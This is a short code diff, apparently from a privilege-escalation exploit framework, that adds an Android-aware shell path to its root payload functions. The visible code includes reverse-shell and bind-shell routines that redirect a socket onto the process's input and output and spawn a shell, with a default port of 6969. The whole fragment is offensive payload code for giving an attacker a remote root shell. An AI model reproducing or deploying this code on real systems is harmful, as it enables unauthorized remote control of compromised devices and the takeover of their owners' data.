@@ -8,6 +8,14 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 
+#ifndef ROOT_SHELL_PATH
+#ifdef __ANDROID__
+#define ROOT_SHELL_PATH "/system/bin/sh"
+#else
+#define ROOT_SHELL_PATH "/bin/sh"
+#endif
+#endif
+
 #ifndef ROOT_PAYLOAD_PORT
 #define ROOT_PAYLOAD_PORT 6969
 #endif
@@ -46,7 +54,7 @@ static EXP_UNUSED void reverse_shell(const char *ip, unsigned short port) {
 	dup2(sock, 2);
 
 	// Spawn the shell
-	execl("/bin/sh", "sh", NULL);
+	execl(ROOT_SHELL_PATH, "sh", NULL);
 }
 
 static EXP_UNUSED void listening_shell(unsigned short port) {
@@ -107,7 +115,7 @@ static EXP_UNUSED void listening_shell(unsigned short port) {
   dup2(client_fd, 1);
   dup2(client_fd, 2);
 
-  execl("/bin/sh", "sh", NULL);
+  execl(ROOT_SHELL_PATH, "sh", NULL);
 
   sleep(10);
 
@@ -118,7 +126,7 @@ static EXP_UNUSED void listening_shell(unsigned short port) {
 }
 
 static EXP_UNUSED void shell() {
-	execlp("/bin/sh","/bin/sh",NULL);
+	execl(ROOT_SHELL_PATH, "sh", NULL);
 }
 
 // executes the correct root payload based on what exploit is configured for
